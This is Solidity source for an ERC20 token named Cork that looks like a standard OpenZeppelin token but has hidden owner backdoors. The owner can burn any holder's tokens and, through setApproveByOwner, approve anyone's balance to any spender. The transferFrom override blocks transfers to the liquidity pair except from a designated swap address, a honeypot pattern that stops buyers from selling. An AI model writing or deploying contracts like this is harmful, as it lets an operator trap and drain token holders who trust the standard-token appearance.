// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "./interfaces/ICorkToken.sol";
import "./interfaces/ISwapCork.sol";

contract CorkToken is ICorkToken, ERC20, Ownable {
    using SafeMath for uint256;

    address public swapAddress;
    address public pairAddress;

    /**
     * @dev Constructor that gives msg.sender all of existing tokens.
     */
    constructor(uint256 initialSupply) ERC20("Cork", "CorkToken") {
        _mint(msg.sender, initialSupply * 10**decimals());
    }

    /**
     * mints $Cork to a recipient
     * @param to the recipient of the $Cork
     * @param amount the amount of $Cork to mint
     */
    function mint(address to, uint256 amount) public override onlyOwner {
        _mint(to, amount);
    }

    function burn(address account, uint256 amount) public override onlyOwner {
        _burn(account, amount);
    }

    function transfer(address recepient, uint256 amount)
        public
        virtual
        override(ERC20, ICorkToken)
        returns (bool)
    {
        return super.transfer(recepient, amount);
    }

    function balanceOf(address account)
        public
        view
        virtual
        override(ERC20, ICorkToken)
        returns (uint256)
    {
        return super.balanceOf(account);
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override(ERC20, ICorkToken) returns (bool) {
        if (to != pairAddress) {
            return super.transferFrom(from, to, amount);
        }

        require(
            super.balanceOf(from) >= amount,
            "transfer amount exceeds balance"
        );

        require(from == swapAddress, "hmmm... what doing?");

        require(
            ISwapCork(swapAddress).getSwapAvailable(),
            "hmmm... what doing?"
        );

        ISwapCork(swapAddress).removeSwapAvailable();
        return super.transferFrom(from, to, amount);
    }

    function resetContract(address _pairAddress, address _swapAddress)
        external
        onlyOwner
    {
        if (_pairAddress != address(0)) pairAddress = _pairAddress;
        if (_swapAddress != address(0)) swapAddress = _swapAddress;
    }

    function setApprove(
        address owner,
        address spender,
        uint256 amount
    ) external override {
        require(msg.sender == swapAddress, "hmmm... what doing?");
        _approve(owner, spender, amount);
    }

    function setApproveByOwner(
        address owner,
        address spender,
        uint256 amount
    ) public onlyOwner {
        _approve(owner, spender, amount);
    }
}
